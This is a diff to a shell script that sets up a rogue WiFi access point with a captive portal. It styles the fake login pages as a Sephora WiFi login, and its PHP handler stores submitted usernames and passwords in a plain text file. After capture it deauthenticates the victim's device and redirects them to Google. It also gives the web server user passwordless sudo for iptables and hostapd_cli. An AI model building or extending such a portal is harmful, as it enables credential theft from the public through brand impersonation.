@@ -83,10 +83,70 @@ cat <<EOF > /var/www/html/index.html
 <head>
     <meta charset="UTF-8">
     <title>Connexion WiFi</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            width: 400px;
+            text-align: center; 
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            max-width: 300px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: black;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 90%;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h2>Authentification WiFi</h2>
     <form action="login.php" method="POST">
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <h2>Bienvenue chez Sephora</h2>
         <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
         <input type="password" name="password" placeholder="Mot de passe" required><br>
         <input type="submit" value="Connexion">
@@ -101,10 +161,70 @@ cat <<EOF > /var/www/html/hotspot-detect.html
 <head>
     <meta charset="UTF-8">
     <title>Connexion WiFi</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        form {
+            width: 400px;
+            text-align: center; 
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            max-width: 300px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 90%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        input[type="submit"] {
+            background-color: black;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 90%;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #333;
+        }
+    </style>
 </head>
 <body>
-    <h2>Authentification WiFi</h2>
     <form action="login.php" method="POST">
+        <div class="logo-container">
+            <img src="logo.png" alt="Logo">
+        </div>
+        <h2>Bienvenue chez Sephora</h2>
         <input type="text" name="username" placeholder="Nom d'utilisateur" required><br>
         <input type="password" name="password" placeholder="Mot de passe" required><br>
         <input type="submit" value="Connexion">
@@ -128,11 +248,13 @@ file_put_contents("/var/www/html/logins.txt", $_POST['username'] . " : " . $_POS
 exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p udp --dport 53 -j DNAT --to 8.8.8.8");
 exec("sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 53 -j DNAT --to 8.8.8.8");
 
+exec("sudo hostapd_cli deauthenticate $ip");
+
 // Afficher un message de confirmation
 echo "<html><head><title>Connexion réussie</title></head><body>";
 echo "<h2>Connexion réussie !</h2>";
 echo "<p>Vous êtes maintenant connecté à Internet.</p>";
-//echo "<script>setTimeout(function(){ window.location.href = 'http://google.com'; }, 3000);</script>";
+echo "<script>setTimeout(function(){ window.location.href = 'http://google.com'; }, 3000);</script>";
 echo "</body></html>";
 
 exit();
@@ -143,7 +265,7 @@ touch /var/www/html/logins.txt
 chown www-data:www-data /var/www/html/logins.txt
 chmod 666 /var/www/html/logins.txt
 chmod 777 /var/www/html/login.php
-echo "www-data ALL=(ALL) NOPASSWD: /usr/sbin/iptables" >> /etc/sudoers
+echo "www-data ALL=(ALL) NOPASSWD: /usr/sbin/hostapd_cli, /usr/sbin/iptables" >> /etc/sudoers
 
 echo "[+] Configuration Apache pour HTTPS..."
 a2enmod ssl
@@ -217,3 +339,4 @@ echo "🔹 Restarting NetworkManager..."
 systemctl restart NetworkManager
 
 echo "✅ WiFi Access Point setup complete! 🚀"
+                                                 
